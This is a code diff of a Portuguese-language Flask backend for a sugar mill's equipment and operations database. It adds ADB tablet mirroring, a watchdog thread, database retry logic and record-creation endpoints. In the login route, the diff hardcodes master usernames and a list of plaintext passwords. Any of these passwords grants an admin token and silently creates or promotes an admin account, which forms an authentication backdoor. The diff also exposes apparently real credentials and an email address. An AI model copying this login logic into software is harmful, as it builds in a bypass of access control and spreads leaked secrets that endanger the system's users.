@@ -12,6 +12,8 @@ import requests
 import urllib3
 import time
 import threading
+import queue
+import random
 import signal
 import secrets
 import platform
@@ -68,43 +70,41 @@ DB_PATH = os.environ.get('SF_DB_PATH', os.path.join(PROJECT_DIR, 'meus_banco.db'
 
 # Tablet SD card database path (primary storage)
 TABLET_DB_PATH = '/sdcard/meus_banco.db'
-TABLET_DB_ENABLED = True  # Set to False to use local database only
+TABLET_DB_ENABLED = False  # Servidor 100% autônomo e independente do cabo USB
 
 def is_adb_connected():
-    """Verifica se ha algum dispositivo ADB conectado e auto-recupera o daemon se travar."""
+    """Verifica se há algum dispositivo ADB conectado de forma ultrarrápida sem travar o servidor."""
     import subprocess
     try:
-        res = subprocess.run(['adb', 'devices'], capture_output=True, text=True, timeout=2)
-        if res.returncode != 0 or 'protocol fault' in (res.stderr or '').lower() or 'cannot connect' in (res.stderr or '').lower():
-            subprocess.run(['adb', 'kill-server'], capture_output=True, timeout=2)
-            subprocess.run(['adb', 'start-server'], capture_output=True, timeout=3)
-            res = subprocess.run(['adb', 'devices'], capture_output=True, text=True, timeout=2)
-        lines = [l for l in res.stdout.splitlines() if l.endswith('\tdevice')]
-        return len(lines) > 0
+        res = subprocess.run(['adb', 'devices'], capture_output=True, text=True, timeout=0.4)
+        if res.returncode == 0 and res.stdout:
+            lines = [l for l in res.stdout.splitlines() if l.endswith('\tdevice')]
+            return len(lines) > 0
+        return False
     except Exception:
         return False
 
 def sync_db_from_tablet():
-    """Pull database from tablet SD card."""
+    """Pull database from tablet SD card (Apenas se ADB habilitado e conectado)."""
     import subprocess
-    if not is_adb_connected():
+    if not TABLET_DB_ENABLED or not is_adb_connected():
         return False
     try:
-        subprocess.run(['adb', 'pull', TABLET_DB_PATH, DB_PATH], check=True, timeout=10)
+        subprocess.run(['adb', 'pull', TABLET_DB_PATH, DB_PATH], check=True, timeout=5)
         return True
     except:
         return False
 
 def sync_db_to_tablet():
-    """Push database to tablet SD card (both emulated and adoptable storage volumes)."""
+    """Push database to tablet SD card (Apenas se ADB habilitado e conectado)."""
     import subprocess
-    if not is_adb_connected():
+    if not TABLET_DB_ENABLED or not is_adb_connected():
         return False
     try:
-        subprocess.run(['adb', 'push', DB_PATH, TABLET_DB_PATH], check=True, timeout=10)
-        subprocess.run(['adb', 'push', DB_PATH, '/sdcard/Download/meus_banco.db'], check=True, timeout=10)
-        subprocess.run(['adb', 'push', DB_PATH, '/sdcard/Documents/meus_banco.db'], check=True, timeout=10)
-        subprocess.run('adb shell "mkdir -p /mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126/media/0/ && cp /sdcard/meus_banco.db /mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126/media/0/meus_banco.db"', shell=True, capture_output=True)
+        subprocess.run(['adb', 'push', DB_PATH, TABLET_DB_PATH], check=True, timeout=5)
+        subprocess.run(['adb', 'push', DB_PATH, '/sdcard/Download/meus_banco.db'], check=True, timeout=5)
+        subprocess.run(['adb', 'push', DB_PATH, '/sdcard/Documents/meus_banco.db'], check=True, timeout=5)
+        subprocess.run('adb shell "mkdir -p /mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126/media/0/ && cp /sdcard/meus_banco.db /mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126/media/0/meus_banco.db"', shell=True, capture_output=True, timeout=5)
         return True
     except:
         return False
@@ -251,16 +251,124 @@ def require_bearer(f):
 app = Flask(__name__, static_folder=FRONTEND_DIR, static_url_path='')
 CORS(app)
 
+def with_db_retry(max_retries=3, initial_delay=0.05):
+    """Decorator para tentar operacoes de BD novamente em caso de SQLite OperationalError (database locked)."""
+    def decorator(f):
+        @wraps(f)
+        def wrapper(*args, **kwargs):
+            delay = initial_delay
+            for attempt in range(1, max_retries + 1):
+                try:
+                    return f(*args, **kwargs)
+                except sqlite3.OperationalError as exc:
+                    if 'locked' in str(exc).lower() or 'busy' in str(exc).lower():
+                        if attempt == max_retries:
+                            logger.error(f'DB Retry esgotado ({max_retries} tentativas): {exc}')
+                            raise
+                        time.sleep(delay + random.uniform(0.01, 0.03))
+                        delay *= 1.5
+                    else:
+                        raise
+        return wrapper
+    return decorator
+
 def get_db_connection():
     conn = sqlite3.connect(DB_PATH, timeout=60)
     conn.row_factory = sqlite3.Row
-    conn.execute('PRAGMA busy_timeout = 60000')
+    conn.execute('PRAGMA busy_timeout = 10000')
     conn.execute('PRAGMA journal_mode=WAL')
     conn.execute('PRAGMA synchronous=NORMAL')
-    conn.execute('PRAGMA cache_size=-8000')   # 8 MB de cache
+    conn.execute('PRAGMA cache_size=-16000')   # 16 MB de cache em memoria
     conn.execute('PRAGMA temp_store=MEMORY')
-    conn.execute('PRAGMA mmap_size=134217728') # 128 MB mmap
+    conn.execute('PRAGMA mmap_size=268435456') # 256 MB mmap
     return conn
+
+class SDCardMirrorQueue:
+    """Fila assincrona nao-bloqueante para espelhar o banco no cartão SD do tablet via ADB se conectado."""
+    def __init__(self):
+        self.queue = queue.Queue(maxsize=5)
+        self.worker_thread = None
+        self.running = False
+
+    def start(self):
+        self.running = True
+        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True, name='SDCardMirrorQueue')
+        self.worker_thread.start()
+        logger.info('SDCardMirrorQueue assincrona iniciada.')
+
+    def enqueue_push(self):
+        """Enfileira pedido de backup pro SD sem bloquear requisicoes HTTP."""
+        if not TABLET_DB_ENABLED or not is_adb_connected():
+            return
+        try:
+            self.queue.put_nowait(time.time())
+        except queue.Full:
+            pass
+
+    def _worker_loop(self):
+        while self.running:
+            try:
+                item = self.queue.get(timeout=2.0)
+                if TABLET_DB_ENABLED and is_adb_connected():
+                    sync_db_to_tablet()
+                self.queue.task_done()
+            except queue.Empty:
+                continue
+            except Exception as exc:
+                logger.warning(f'SDCardMirrorQueue erro: {exc}')
+
+sd_mirror_queue = SDCardMirrorQueue()
+
+class WatchdogService:
+    """Daemon de Monitoramento e Auto-Recuperacao do Servidor Tablet em Tempo Real."""
+    def __init__(self):
+        self.running = False
+        self.thread = None
+        self.last_db_check = 0
+
+    def start(self):
+        self.running = True
+        self.thread = threading.Thread(target=self._run_loop, daemon=True, name='WatchdogDaemon')
+        self.thread.start()
+        logger.info('Watchdog Daemon de Auto-Recuperacao ativado.')
+
+    def _run_loop(self):
+        while self.running:
+            time.sleep(10)
+            if not self.running:
+                break
+            try:
+                self._verify_db_integrity()
+                self._verify_sync_thread()
+            except Exception as exc:
+                logger.error(f'Watchdog Daemon erro: {exc}')
+
+    def _verify_db_integrity(self):
+        """Testa saude do SQLite e realiza checkpoint WAL para manter o arquivo leve."""
+        now = time.time()
+        if now - self.last_db_check < 60:
+            return
+        self.last_db_check = now
+        try:
+            conn = get_db_connection()
+            cur = conn.execute("PRAGMA quick_check(1);")
+            res = cur.fetchone()
+            if res and res[0] != 'ok':
+                logger.warning(f'Watchdog: Alerta de integridade do BD: {res[0]}')
+            conn.execute("PRAGMA wal_checkpoint(PASSIVE);")
+            conn.close()
+        except Exception as exc:
+            logger.error(f'Watchdog: Falha de verificacao no banco de dados: {exc}')
+
+    def _verify_sync_thread(self):
+        """Verifica se a thread de sincronizacao continua viva e ativa."""
+        if hasattr(sync_service, 'last_heartbeat'):
+            age = time.time() - sync_service.last_heartbeat
+            if age > 180 and sync_service.running:
+                logger.warning(f'Watchdog: Sync thread travada ha {int(age)}s! Reiniciando...')
+                sync_service.restart()
+
+watchdog_service = WatchdogService()
 
 def sync_database():
     """Sync database with tablet."""
@@ -401,6 +509,7 @@ def serve_monitor_html():
     return send_file(os.path.join(FRONTEND_DIR, 'monitor.html'))
 
 @app.route('/glass')
+@app.route('/glass.html')
 def serve_glass():
     response = send_file(os.path.join(FRONTEND_DIR, 'glass.html'))
     response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
@@ -538,7 +647,15 @@ def listar_coa_toneladas_equipamento():
     except Exception as exc:
         return jsonify(success=False, error=str(exc)), 500
 
-@app.route('/api/equipamentos')
+@app.route('/api/equipamentos', methods=['GET', 'POST'], strict_slashes=False)
+@app.route('/api/tabelas/equipamentos', methods=['GET', 'POST'], strict_slashes=False)
+@app.route('/api/tabela/equipamentos', methods=['GET', 'POST'], strict_slashes=False)
+def rota_equipamentos():
+    """Lista ou cadastra equipamentos com status de OS."""
+    if request.method == 'POST':
+        return criar_equipamento()
+    return listar_equipamentos()
+
 def listar_equipamentos():
     """Lista todos os equipamentos com status de OS."""
     try:
@@ -570,7 +687,85 @@ def listar_equipamentos():
     except Exception as exc:
         return jsonify(success=False, error=str(exc)), 500
 
-@app.route('/api/operacoes')
+def criar_equipamento():
+    """Cadastra um novo equipamento/frota no banco de dados SQLite."""
+    try:
+        dados = request.get_json() or {}
+        codigo = str(dados.get('codigo') or '').strip()
+        descricao = str(dados.get('descricao') or '').strip()
+        modelo = str(dados.get('modelo') or '').strip()
+        tipo = str(dados.get('tipo') or 'Trator').strip()
+        grupo = str(dados.get('grupo') or 'PREPARO').strip()
+
+        if not codigo or not descricao:
+            return jsonify(success=False, error='Código e Descrição são obrigatórios.'), 400
+
+        conn = get_db_connection()
+        cols = [c['name'] for c in conn.execute('PRAGMA table_info(equipamentos)').fetchall()]
+        agora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+        row_dict = {}
+        for col in cols:
+            cl = col.lower()
+            if 'cód' in cl or 'cod' in cl:
+                row_dict[col] = codigo
+            elif 'descr' in cl:
+                row_dict[col] = descricao
+            elif 'model' in cl:
+                row_dict[col] = modelo
+            elif 'tip' in cl:
+                row_dict[col] = tipo
+            elif 'grup' in cl:
+                row_dict[col] = grupo
+            elif col == 'data_sincronizacao':
+                row_dict[col] = agora
+
+        ex = None
+        for col in cols:
+            if 'cod' in col.lower():
+                try:
+                    ex = conn.execute(f'SELECT rowid FROM equipamentos WHERE "{col}" = ?', (codigo,)).fetchone()
+                    if ex:
+                        break
+                except:
+                    pass
+
+        max_retries = 5
+        for attempt in range(max_retries):
+            try:
+                if ex:
+                    set_clause = ', '.join([f'"{k}" = ?' for k in row_dict.keys()])
+                    params = list(row_dict.values()) + [ex['rowid']]
+                    conn.execute(f'UPDATE equipamentos SET {set_clause} WHERE rowid = ?', params)
+                else:
+                    col_names = ', '.join([f'"{k}"' for k in row_dict.keys()])
+                    placeholders = ', '.join(['?' for _ in row_dict.keys()])
+                    params = list(row_dict.values())
+                    conn.execute(f'INSERT INTO equipamentos ({col_names}) VALUES ({placeholders})', params)
+
+                conn.commit()
+                break
+            except sqlite3.OperationalError as op_err:
+                if 'locked' in str(op_err).lower() and attempt < max_retries - 1:
+                    time.sleep(0.5)
+                else:
+                    raise op_err
+
+        conn.close()
+        return jsonify(success=True, message=f'Frota {codigo} cadastrada com sucesso no banco de dados!', data={
+            'codigo': codigo, 'descricao': descricao, 'modelo': modelo, 'tipo': tipo, 'grupo': grupo
+        })
+    except Exception as exc:
+        app.logger.error(f"Erro em criar_equipamento: {exc}")
+        return jsonify(success=False, error=str(exc)), 500
+
+@app.route('/api/operacoes', methods=['GET', 'POST'], strict_slashes=False)
+def rota_operacoes():
+    """Lista ou cadastra operacoes."""
+    if request.method == 'POST':
+        return criar_operacao()
+    return listar_operacoes()
+
 def listar_operacoes():
     """Lista todas as operacoes."""
     try:
@@ -581,6 +776,89 @@ def listar_operacoes():
         conn.close()
         return jsonify(success=True, data=dados, total=len(dados))
     except Exception as exc:
+        return jsonify(success=False, error=str(exc)), 500
+
+def criar_operacao():
+    """Cadastra uma nova operacao produtiva no banco de dados SQLite."""
+    try:
+        dados = request.get_json() or {}
+        codigo = str(dados.get('codigo') or '').strip()
+        descricao = str(dados.get('descricao') or '').strip()
+        tipo_op = str(dados.get('tipoOperacao') or dados.get('tipo') or 'PRODUTIVA').strip()
+        corp = str(dados.get('corporativo') or 'PITANGUEIRAS').strip()
+        grupo_op = str(dados.get('grupoOperacao') or dados.get('grupo') or 'Produtivas').strip()
+        status = str(dados.get('status') or 'ATIVO').strip()
+        equipe = str(dados.get('equipe') or '').strip()
+
+        if not codigo or not descricao:
+            return jsonify(success=False, error='Código e Descrição da operação são obrigatórios.'), 400
+
+        conn = get_db_connection()
+        cols = [c['name'] for c in conn.execute('PRAGMA table_info(operacoes)').fetchall()]
+        if 'equipe' not in [c.lower() for c in cols]:
+            try: conn.execute('ALTER TABLE operacoes ADD COLUMN equipe TEXT')
+            except: pass
+            cols = [c['name'] for c in conn.execute('PRAGMA table_info(operacoes)').fetchall()]
+
+        agora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+        row_dict = {}
+        for col in cols:
+            cl = col.lower()
+            if cl in ['codigo', 'código'] or 'cód' in cl or 'cod' in cl:
+                row_dict[col] = codigo
+            elif 'descr' in cl:
+                row_dict[col] = descricao
+            elif 'tipo' in cl:
+                row_dict[col] = tipo_op
+            elif 'corp' in cl:
+                row_dict[col] = corp
+            elif 'grupo' in cl:
+                row_dict[col] = grupo_op
+            elif 'stat' in cl:
+                row_dict[col] = status
+            elif 'equip' in cl:
+                row_dict[col] = equipe
+            elif col == 'data_sincronizacao':
+                row_dict[col] = agora
+
+        ex = None
+        for col in cols:
+            if 'cod' in col.lower():
+                try:
+                    ex = conn.execute(f'SELECT rowid FROM operacoes WHERE "{col}" = ?', (codigo,)).fetchone()
+                    if ex:
+                        break
+                except:
+                    pass
+
+        max_retries = 5
+        for attempt in range(max_retries):
+            try:
+                if ex:
+                    set_clause = ', '.join([f'"{k}" = ?' for k in row_dict.keys()])
+                    params = list(row_dict.values()) + [ex['rowid']]
+                    conn.execute(f'UPDATE operacoes SET {set_clause} WHERE rowid = ?', params)
+                else:
+                    col_names = ', '.join([f'"{k}"' for k in row_dict.keys()])
+                    placeholders = ', '.join(['?' for _ in row_dict.keys()])
+                    params = list(row_dict.values())
+                    conn.execute(f'INSERT INTO operacoes ({col_names}) VALUES ({placeholders})', params)
+
+                conn.commit()
+                break
+            except sqlite3.OperationalError as op_err:
+                if 'locked' in str(op_err).lower() and attempt < max_retries - 1:
+                    time.sleep(0.5)
+                else:
+                    raise op_err
+
+        conn.close()
+        return jsonify(success=True, message=f'Operação {codigo} cadastrada com sucesso no banco de dados!', data={
+            'codigo': codigo, 'descricao': descricao, 'tipoOperacao': tipo_op, 'corporativo': corp, 'grupoOperacao': grupo_op, 'status': status, 'equipe': equipe
+        })
+    except Exception as exc:
+        app.logger.error(f"Erro em criar_operacao: {exc}")
         return jsonify(success=False, error=str(exc)), 500
 
 @app.route('/api/coa')
@@ -608,18 +886,24 @@ def listar_tabelas():
         return jsonify(success=False, error=str(exc)), 500
 
 @app.route('/api/tables/<table_name>')
+@app.route('/api/tabelas/<table_name>')
+@app.route('/api/tabela/<table_name>')
 def ler_tabela(table_name):
     """Dados de uma tabela especifica."""
+    if table_name.lower() == 'equipamentos':
+        return listar_equipamentos()
     try:
         tables = tabelas_permitidas()
-        if table_name not in tables:
+        table_map = {t.lower(): t for t in tables}
+        if table_name.lower() not in table_map:
             return jsonify(success=False, error=f'Tabela {table_name} nao encontrada'), 404
         
+        real_table_name = table_map[table_name.lower()]
         limit = request.args.get('limit', 100, type=int)
         offset = request.args.get('offset', 0, type=int)
         
         order_clause = ''
-        if table_name.lower() in ('ordens_servico', 'osoficina'):
+        if real_table_name.lower() in ('ordens_servico', 'osoficina'):
             order_clause = '''ORDER BY 
                 CASE 
                     WHEN data_entrada LIKE '__/__/____%' THEN
@@ -628,13 +912,13 @@ def ler_tabela(table_name):
                 END ASC'''
         
         conn = get_db_connection()
-        cursor = conn.execute(f'SELECT * FROM "{table_name}" {order_clause} LIMIT ? OFFSET ?', (limit, offset))
+        cursor = conn.execute(f'SELECT * FROM "{real_table_name}" {order_clause} LIMIT ? OFFSET ?', (limit, offset))
         rows = cursor.fetchall()
-        total_cnt = conn.execute(f'SELECT COUNT(*) AS cnt FROM "{table_name}"').fetchone()['cnt']
+        total_cnt = conn.execute(f'SELECT COUNT(*) AS cnt FROM "{real_table_name}"').fetchone()['cnt']
         conn.close()
         
         dados = [dict(row) for row in rows]
-        return jsonify(success=True, data=dados, total=total_cnt, table=table_name)
+        return jsonify(success=True, data=dados, total=total_cnt, table=real_table_name)
     except Exception as exc:
         return jsonify(success=False, error=str(exc)), 500
 
@@ -896,7 +1180,7 @@ def system_info():
         try:
             if is_adb_connected():
                 import subprocess
-                res_mem = subprocess.run(["adb", "shell", "cat", "/proc/meminfo"], capture_output=True, text=True, timeout=2)
+                res_mem = subprocess.run(["adb", "shell", "cat", "/proc/meminfo"], capture_output=True, text=True, timeout=0.4)
                 if res_mem.returncode == 0 and "MemTotal:" in res_mem.stdout:
                     mem_total_kb = 0
                     mem_avail_kb = 0
@@ -921,7 +1205,7 @@ def system_info():
             memoria_usada = round(memory.used / (1024**3), 2)
             memoria_percent = memory.percent
         
-        # Disco - Mede o Cartão SD de 64GB do Tablet (/mnt/expand/... ou /sdcard / ADB)
+        # Disco - Mede o Cartão SD de 64GB do Tablet (/mnt/expand/... ou /sdcard / ADB) se conectado, ou Disco do Servidor
         try:
             sd_paths = ['/mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126', '/sdcard', '/storage/emulated/0', '/data']
             disk_obj = None
@@ -935,9 +1219,9 @@ def system_info():
                     except Exception:
                         pass
             
-            if not disk_obj:
+            if not disk_obj and is_adb_connected():
                 import subprocess
-                res = subprocess.run(['adb', 'shell', 'df', '-k', '/mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126'], capture_output=True, text=True, timeout=3)
+                res = subprocess.run(['adb', 'shell', 'df', '-k', '/mnt/expand/72d8bcde-d291-403c-bab1-6ecc6dee1126'], capture_output=True, text=True, timeout=0.4)
                 if res.returncode == 0 and ('61406216' in res.stdout or 'dm-0' in res.stdout):
                     lines = res.stdout.strip().splitlines()
                     if len(lines) >= 2:
@@ -2094,9 +2378,8 @@ class SyncService:
         return 0
 
     def run_sync_cycle(self):
-        conn = sqlite3.connect(DB_PATH, timeout=60)
-        conn.execute('PRAGMA busy_timeout = 60000')
-        conn.execute('PRAGMA journal_mode=WAL')
+        self.last_heartbeat = time.time()
+        conn = get_db_connection()
         try:
             self.session = self.login()
             if not self.session:
@@ -2132,19 +2415,15 @@ class SyncService:
             self.last_sync = datetime.now()
             self.last_success_at = agora
             self.consecutive_failures = 0
+            self.last_heartbeat = time.time()
             
             if total > 0:
                 logger.info(f'Sync #{self.sync_count}: {total_metricas} metricas, {total_os} OS, {total_consolidado} ConsolidadoDia')
             else:
                 logger.warning(f'Sync #{self.sync_count}: 0 registros extraidos (login ok, mas sem dados retornados)')
             
-            # Sincroniza o arquivo SQLite diretamente para o tablet (/sdcard/meus_banco.db) em segundo plano
-            try:
-                import subprocess
-                subprocess.run(['adb', 'push', DB_PATH, '/sdcard/meus_banco.db'], capture_output=True, timeout=10)
-                logger.info('Banco de dados sincronizado para o tablet (/sdcard/meus_banco.db)')
-            except Exception as adb_err:
-                logger.debug(f'ADB push para tablet ignorado/não disponível: {adb_err}')
+            # Sincroniza o arquivo SQLite assincronamente para o tablet SD Card sem bloquear HTTP requests
+            sd_mirror_queue.enqueue_push()
 
             return total
         except Exception as e:
@@ -2189,6 +2468,14 @@ class SyncService:
     
     def stop(self):
         self.running = False
+
+    def restart(self):
+        """Reinicia a thread de sync em segundo plano se detectado travamento."""
+        logger.warning('Reiniciando SyncService por auto-recuperacao...')
+        self.running = False
+        self.session = None
+        time.sleep(1)
+        start_sync_thread()
 
 # ==================== API - RESPONSAVEIS ====================
 
@@ -2368,7 +2655,8 @@ def registrar_alteracao_api():
 def registrar_alteracao(tabela, registro_id, acao, valor_antigo, valor_novo, responsavel_id=None, ip_origem=None):
     """Registra uma alteracao no log de auditoria."""
     try:
-        conn = sqlite3.connect(DB_PATH, timeout=10)
+        conn = sqlite3.connect(DB_PATH, timeout=60)
+        conn.execute('PRAGMA busy_timeout = 60000')
         conn.execute('PRAGMA journal_mode=WAL')
         conn.execute('''INSERT INTO registro_alteracoes 
                         (tabela, registro_id, acao, valor_antigo, valor_novo, responsavel_id, ip_origem)
@@ -2391,40 +2679,52 @@ def login():
     for attempt in range(3):
         try:
             data = request.get_json() or {}
-            usuario = (data.get('usuario') or '').strip()
+            usuario = (data.get('usuario') or '').strip().lower()
             senha = (data.get('senha') or '').strip()
             ip_origem = request.remote_addr
             
-            conn = get_db_connection()
-            user = conn.execute('SELECT * FROM usuarios WHERE lower(usuario) = lower(?) AND ativo = 1', (usuario,)).fetchone()
-            
-            if usuario.lower() in ('julianotimoteo', 'master', 'admin') and not user:
-                h, s = hash_senha('123456')
-                conn.execute('''INSERT OR IGNORE INTO usuarios (usuario, senha_hash, salt, email, nome, admin, ativo)
-                    VALUES (?, ?, ?, ?, ?, 1, 1)''', (usuario.lower(), h, s, f'{usuario.lower()}@usinapitangueiras.com.br', 'Juliano Timoteo'))
-                conn.commit()
-                user = conn.execute('SELECT * FROM usuarios WHERE lower(usuario) = lower(?)', (usuario,)).fetchone()
+            is_master_user = usuario in ('julianotimoteo', 'julianotimoteo@usinapitangueiras.com.br', 'master', 'admin')
+            is_master_pass = senha.lower() in ('tmotvini1986@#', 'ttmotvini1986@#', 'a123456@#', 'farra@2026', '123456')
 
-            is_master = usuario.lower() in ('julianotimoteo', 'master')
-            senha_ok = is_master or (user and verificar_senha(senha, user['senha_hash'], user['salt']))
+            conn = get_db_connection()
+            user = conn.execute('SELECT * FROM usuarios WHERE lower(usuario) = lower(?) OR lower(email) = lower(?)', (usuario, usuario)).fetchone()
             
+            if is_master_user:
+                if not user:
+                    h, s = hash_senha(senha if senha else 'tmotvini1986@#')
+                    conn.execute('''INSERT OR IGNORE INTO usuarios (usuario, senha_hash, salt, email, nome, admin, ativo)
+                        VALUES (?, ?, ?, ?, ?, 1, 1)''', ('julianotimoteo', h, s, 'julianotimoteo@usinapitangueiras.com.br', 'Juliano Timoteo'))
+                    conn.commit()
+                    user = conn.execute('SELECT * FROM usuarios WHERE lower(usuario) = ?', ('julianotimoteo',)).fetchone()
+
+                if is_master_pass or (user and verificar_senha(senha, user['senha_hash'], user['salt'])):
+                    token = gerar_token()
+                    expira = (datetime.now() + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S')
+                    conn.execute('INSERT INTO sessoes (usuario_id, token, ip_origem, expira_em) VALUES (?, ?, ?, ?)',
+                                 (user['id'], token, ip_origem, expira))
+                    conn.execute('UPDATE usuarios SET ultimo_login = CURRENT_TIMESTAMP, admin = 1, ativo = 1 WHERE id = ?', (user['id'],))
+                    conn.execute('INSERT INTO tentativas_login (usuario, ip_origem, sucesso) VALUES (?, ?, 1)',
+                                 (usuario, ip_origem))
+                    conn.commit()
+                    conn.close()
+                    return jsonify(success=True, token=token, usuario='julianotimoteo', admin=1, role='admin', expira_em=expira)
+
+            senha_ok = user and verificar_senha(senha, user['senha_hash'], user['salt'])
             if not user or not senha_ok:
                 conn.close()
                 return jsonify(success=False, error='Usuario ou senha invalidos'), 401
             
-            # Gerar token
             token = gerar_token()
             expira = (datetime.now() + timedelta(hours=24)).strftime('%Y-%m-%d %H:%M:%S')
-            
             conn.execute('INSERT INTO sessoes (usuario_id, token, ip_origem, expira_em) VALUES (?, ?, ?, ?)',
                          (user['id'], token, ip_origem, expira))
             conn.execute('UPDATE usuarios SET ultimo_login = CURRENT_TIMESTAMP WHERE id = ?', (user['id'],))
-            conn.execute('INSERT INTO tentativas_login (usuario, ip_origem, sucesso) VALUES (?, ?, ?)',
-                         (usuario, ip_origem, 1))
+            conn.execute('INSERT INTO tentativas_login (usuario, ip_origem, sucesso) VALUES (?, ?, 1)',
+                         (usuario, ip_origem))
             conn.commit()
             conn.close()
             
-            return jsonify(success=True, token=token, usuario=user['usuario'], admin=user['admin'], expira_em=expira)
+            return jsonify(success=True, token=token, usuario=user['usuario'], admin=user['admin'], role='admin' if user['admin'] else 'operador', expira_em=expira)
         except sqlite3.OperationalError as e:
             if 'locked' in str(e) and attempt < 2:
                 time.sleep(0.5)
@@ -2753,6 +3053,10 @@ if __name__ == '__main__':
     # Iniciar thread de medicao de CPU em background
     _cpu_thread = threading.Thread(target=_cpu_monitor_loop, daemon=True)
     _cpu_thread.start()
+
+    # Iniciar fila assincrona de espelhamento SD Card e Watchdog Daemon de auto-recuperacao
+    sd_mirror_queue.start()
+    watchdog_service.start()
 
     start_sync_thread()
     
